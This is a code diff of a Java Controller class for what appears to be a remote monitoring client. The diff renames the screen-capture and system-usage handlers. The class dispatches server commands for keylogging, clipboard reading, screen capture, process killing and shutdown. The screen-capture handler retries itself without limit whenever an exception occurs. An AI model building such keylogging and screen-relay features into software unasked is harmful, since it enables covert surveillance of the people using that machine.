@@ -31,12 +31,12 @@ public class Controller {
 
     public static void init() {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
-        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getMonitoring);
+        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
+        put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
         put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
-        put(COMMAND_CLIENT_MONITOR, Controller::getScreen);
         put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
     }
 
@@ -52,7 +52,7 @@ public class Controller {
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_SYSTEM_INFO).put("result", new JSON(si)).json();
     }
 
-    private static String getScreen(JSON input) {
+    private static String getClientMonitor(JSON input) {
         try {
             BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
@@ -63,11 +63,11 @@ public class Controller {
                     .put("length", tmp.length)
                     .json();
         } catch (Exception e) {
-            return getScreen(input);
+            return getClientMonitor(input);
         }
     }
 
-    private static String getMonitoring(JSON input) {
+    private static String getClientSystemUsage(JSON input) {
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_SYSTEM_USAGE)
                 .put("ram", si.getMemoryLoadPercentage())
                 .put("cpu", si.getProcessorLoadPercentage())
